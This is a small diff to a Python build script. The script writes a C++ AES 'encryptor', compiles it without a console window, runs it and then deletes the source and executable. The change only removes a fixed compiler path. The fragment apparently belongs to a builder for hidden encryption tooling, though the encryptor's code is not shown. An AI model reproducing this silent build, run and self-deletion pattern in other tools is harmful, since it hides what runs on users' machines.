@@ -76,7 +76,7 @@ int main()
 """)
     
     f.close()
-    os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -w -o Cast\\encryptor Cast\\encryptor.cpp Cast\\TinyAES.c -mwindows")
+    os.system(f"g++ --static -w -o Cast\\encryptor Cast\\encryptor.cpp Cast\\TinyAES.c -mwindows")
     os.system("Cast\\encryptor.exe")
     os.remove("Cast\\encryptor.cpp")
     os.remove("Cast\\encryptor.exe")
